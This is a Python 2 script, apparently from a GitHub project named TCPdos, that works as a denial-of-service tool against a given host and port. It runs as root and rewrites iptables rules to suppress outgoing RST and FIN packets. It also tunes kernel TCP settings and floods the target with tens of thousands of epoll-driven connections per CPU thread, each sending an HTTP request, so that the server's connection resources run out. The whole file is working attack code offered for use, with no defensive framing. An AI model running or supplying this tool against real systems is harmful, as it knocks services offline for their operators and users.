# WuffAndre.py
# by WuffAndre <https://github.com/WuffAndre>

import socket, select, sys, os

# Global variables filled with argv parameters
host = None
port = None
ip = None

# Exit and print code
def exit(code):
    print "+ Exiting with code %d..." % (code)
    sys.exit(code)

# Get parameters
try:
    host = sys.argv[1]
    port = int(sys.argv[2])
except:
    print "! Error: Invalid arguments"
    print "         Usage: wuffandre.py <ip/host> <port>"
    exit(3)

print "+ Running wuffandre.py..."

# Detect platform and do not run on other than Linux
try:
    import platform
    currentPlatform = platform.system()
    if currentPlatform != "Linux":
        print "! Error: Your detected platform is %s, but this script will only work under Linux" % (currentPlatform)
        exit(3)
except:
    print "! Error: You dont have 'platform' module installed, so we cant detect if you are running Linux"
    print "         This script will try to continue, but will only work under Linux"
    pass

# Check root
if os.geteuid() != 0:
    print "! Error: This script requires running as root to manipulate iptables and kernel flags"
    exit(3)

# Resolve host
try:
    print "+ Resolving ip of host %s..." % (host)
    ip = socket.gethostbyname(host)
except Exception as e:
    print "! Error: Could not resolve '%s': %s %s" % (host, type(e).__name__, e.message)
    exit(3)

print "+ Target IP is %s" % (ip)

# Helper variables
connectionsPerWorker = 40000
threads = []
finish = False

# Add target to iptables
def addIpTables(ip, port):
    print "+ Adding DROP and NOTRACK iptables for the target..."
    os.system("iptables -t raw -I PREROUTING -s %s -p tcp --sport %d -j NOTRACK" % (ip, port))
    os.system("iptables -t raw -I OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP 2>/dev/null" % (ip, port))
    os.system("iptables -t raw -I OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP 2>/dev/null" % (ip, port))
    os.system("iptables -t raw -I OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN,ACK FIN,ACK -j DROP 2>/dev/null" % (ip, port))
    os.system("iptables -t raw -I OUTPUT -d %s -p tcp --dport %d -j NOTRACK 2>/dev/null" % (ip, port))

# Remove target from iptables
def removeIpTables(ip, port):
    print "+ Removing DROP and NOTRACK iptables for the target..."
    os.system("iptables -t raw -D PREROUTING -s %s -p tcp --sport %d -j NOTRACK 2>/dev/null" % (ip, port))
    os.system("iptables -t raw -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP 2>/dev/null" % (ip, port))
    os.system("iptables -t raw -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP 2>/dev/null" % (ip, port))
    os.system("iptables -t raw -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN,ACK FIN,ACK -j DROP 2>/dev/null" % (ip, port))
    os.system("iptables -t raw -D OUTPUT -d %s -p tcp --dport %d -j NOTRACK 2>/dev/null" % (ip, port))

# Signal handler
def sigHandler(signum, frame):
    print "+ Got signal %d!" % (signum)
    global ip
    global port
    removeIpTables(ip, port)
    exit(0)

# Add connection to epoll queue
def add_connection(epoll, connections, ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    s.connect_ex((ip, port))
    connections[s.fileno()] = s
    epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)

# Set rlimit
try:
    import resource
    print "+ Setting rlimit"
    resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
except:
    print "! Error: Error importing module 'resource' or setting 'nofile' limit, we will continue anyway (the attack may fail)"

# Set kernel flags
# TODO: keep initial flags on start and restore them on exit
# TODO: check if flags are being set, in some Linux versions or configs some flag could be not present
print "+ Setting kernel flags"
os.system("echo 1 > /proc/sys/net/ipv4/tcp_fin_timeout")
os.system("echo 1 > /proc/sys/net/ipv4/tcp_orphan_retries")
os.system("echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse")
os.system("echo 1 > /proc/sys/net/ipv4/tcp_no_metrics_save")
os.system("echo 0 > /proc/sys/net/ipv4/tcp_sack")
os.system("echo 0 > /proc/sys/net/ipv4/tcp_dsack")
os.system("echo 1 > /proc/sys/net/ipv4/tcp_retries2")
os.system("echo 15 > /proc/sys/net/ipv4/tcp_reordering")
os.system("echo 100000 > /proc/sys/net/ipv4/tcp_max_orphans")
os.system("echo 2000 65535 > /proc/sys/net/ipv4/ip_local_port_range")

# Add signal handlers
try:
    import signal
    print "+ Adding signal handlers"
    signal.signal(signal.SIGINT, sigHandler)
    signal.signal(signal.SIGTERM, sigHandler)
except:
    print "! Error: Error importing module 'signal' or adding signal handlers, you must restore iptables yourself when the script finishes!!!"

# Add iptables
addIpTables(ip, port)

# Main worker function
def worker(host, ip, port, workerId):
    global connectionsPerWorker

    print "+ Starting epoll worker and enqueuing %d connections [id=%d]..." % (connectionsPerWorker, workerId)
    epoll = select.epoll()

    connections = {}
    for i in range(1, connectionsPerWorker):
        add_connection(epoll, connections, ip, port)

    print "+ %d connections added into queue, running event loop..." % (connectionsPerWorker)
    try:
        while True:
            events = epoll.poll(-1)
            for fileno, event in events:
                s = connections.pop(fileno)
                if(s):
                    try:
                        s.send("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 wuffandre (https://github.com/wuffandre/TCPdos)\r\nConnection: keep-alive\r\n\r\n" % (host))
                    except:
                        pass
                    s.close()
                    add_connection(epoll, connections, ip, port)

    except Exception as e:
        print "! Error! %s %s at worker [id=%d]" % (type(e).__name__, e.message, workerId)

# Detect cpu count to set number of threads
numThreads = 1
try:
    import multiprocessing
    numThreads = multiprocessing.cpu_count() - 1;
except Exception as e:
    print "! Error detecting CPU core count: %s %s / We will assume that you have single core" % (type(e).__name__, e.message)
    numThreads = 1

# Detect if module threading is present
try:
    import threading
except:
    print "! Error importing module 'threading', we will continue with single thread"
    numThreads = 1

# Detect if module time is present
try:
    import time
except:
    print "! Error importing module 'time' needed for sleeps in thread check loop, we will continue with single thread"
    numThreads = 1

# If running threading mode, launch threads and wait for them
if(numThreads > 1):
    print "+ Host has more than 2 CPU cores, starting %d threads..." % (numThreads)
    for i in range(numThreads):
        t = threading.Thread(target=worker, args=(host, ip, port, i))
        t.daemon = True
        threads.append(t)
        t.start()
    time.sleep(1)
    while threads and not finish:
        for i in threads:
            if not i.is_alive():
                print "! Some thread died"
                finish = True
                break
        time.sleep(1)
else:
    print "+ Host has 2 CPU cores or less, launching attack in main thread"
    worker(host, ip, port, 0)

# If we get here, the attack has finished or script has exited
print "+ Attack finished"
removeIpTables(ip, port)
exit(0)
